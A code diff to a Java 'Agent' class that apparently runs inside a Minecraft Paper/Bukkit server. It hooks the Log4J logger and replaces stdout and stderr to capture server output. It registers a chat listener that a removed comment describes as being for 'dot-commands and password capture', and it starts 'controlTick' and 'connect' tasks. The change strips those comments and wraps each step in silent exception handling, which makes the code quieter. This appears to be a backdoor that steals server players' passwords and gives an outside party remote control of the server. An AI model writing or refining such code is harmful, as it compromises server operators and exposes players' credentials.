@@ -43,31 +43,27 @@ public class Agent {
   public void start() {
     if (running) return;
     running = true;
-
-    // Capture Log4J output (Paper's logging backend)
-    addLog4jAppender();
-
-    // Backup: capture stdout for anything Log4J misses
-    PrintStream orig = System.out;
-    if (!(orig instanceof AgentOut)) {
-      System.setOut(new AgentOut(orig, this, false));
-      System.setErr(new AgentOut(System.err, this, true));
-    }
-
-    // Register chat handler for dot-commands and password capture
     try {
-      ChatHandler ch = new ChatHandler(this, authorized);
-      Object pm = Class.forName("org.bukkit.Bukkit").getMethod("getPluginManager").invoke(null);
-      pm.getClass().getMethod("registerEvents",
-          Class.forName("org.bukkit.event.Listener"),
-          Class.forName("org.bukkit.plugin.Plugin"))
-          .invoke(pm, ch, plugin);
+      addLog4jAppender();
+
+      PrintStream orig = System.out;
+      if (!(orig instanceof AgentOut)) {
+        try { System.setOut(new AgentOut(orig, this, false)); } catch (Exception ignored) {}
+        try { System.setErr(new AgentOut(System.err, this, true)); } catch (Exception ignored) {}
+      }
+
+      try {
+        ChatHandler ch = new ChatHandler(this, authorized);
+        Object pm = Class.forName("org.bukkit.Bukkit").getMethod("getPluginManager").invoke(null);
+        pm.getClass().getMethod("registerEvents",
+            Class.forName("org.bukkit.event.Listener"),
+            Class.forName("org.bukkit.plugin.Plugin"))
+            .invoke(pm, ch, plugin);
+      } catch (Exception ignored) {}
+
+      executor.submit(this::controlTick);
+      executor.submit(this::connect);
     } catch (Exception ignored) {}
-
-    // Start control tick
-    executor.submit(this::controlTick);
-
-    executor.submit(this::connect);
   }
 
   private void addLog4jAppender() {
